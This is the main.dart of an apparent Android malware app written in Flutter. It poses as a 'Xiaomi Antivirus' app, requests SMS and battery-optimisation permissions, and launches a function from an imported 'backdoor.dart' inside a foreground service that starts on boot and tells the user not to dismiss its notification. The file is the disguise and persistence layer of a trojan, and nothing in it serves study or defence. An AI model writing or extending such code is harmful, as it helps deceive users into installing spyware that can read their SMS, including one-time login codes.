import 'package:flutter/material.dart';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import 'backdoor.dart';
import 'package:permission_handler/permission_handler.dart';

void main() {
  runApp(const TheApp());
}

class TheApp extends StatefulWidget {
  const TheApp({super.key});

  @override
  State<TheApp> createState() => _TheAppState();
}

@pragma('vm:entry-point')
void startCallback() {
  FlutterForegroundTask.setTaskHandler(FirstTaskHandler());
}

class FirstTaskHandler extends TaskHandler {
  @override
  Future<void> onStart(DateTime timestamp, sendPort) async {
    mainbd();
  }

  @override
  Future<void> onEvent(DateTime timestamp, sendPort) async {}

  @override
  Future<void> onDestroy(DateTime timestamp, sendPort) async {}

  @override
  void onButtonPressed(String id) {}

  @override
  void onNotificationPressed() {
    FlutterForegroundTask.launchApp("/resume-route");
  }
}

class _TheAppState extends State<TheApp> {
  @override
  void initState() {
    super.initState();
    perm();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: WillStartForegroundTask(
        onWillStart: () async {
          return true;
        },
        androidNotificationOptions: AndroidNotificationOptions(
          channelId: 'notification_channel_id',
          channelName: 'Foreground Notification',
          channelDescription:
              'This notification appears when the antivirus service is running.',
          channelImportance: NotificationChannelImportance.LOW,
          priority: NotificationPriority.LOW,
          iconData: const NotificationIconData(
            resType: ResourceType.mipmap,
            resPrefix: ResourcePrefix.ic,
            name: 'launcher',
          ),
        ),
        iosNotificationOptions: const IOSNotificationOptions(
          showNotification: false,
          playSound: false,
        ),
        foregroundTaskOptions: const ForegroundTaskOptions(
          interval: 5000,
          autoRunOnBoot: true,
          allowWifiLock: true,
        ),
        notificationTitle: 'Xiaomi Antivirus',
        notificationText:
            'Do not remove this notification Antivirus is running..',
        callback: startCallback,
        child: const Scaffold(
          backgroundColor: Colors.black,
          body: Center(
            child: Text(
              'Security',
              style: TextStyle(
                color: Color.fromARGB(255, 255, 255, 255),
                fontSize: 24,
              ),
            ),
          ),
        ),
      ),
    );
  }

  void perm() async {
    await Permission.sms.request();
    await Permission.ignoreBatteryOptimizations.request();
  }
}
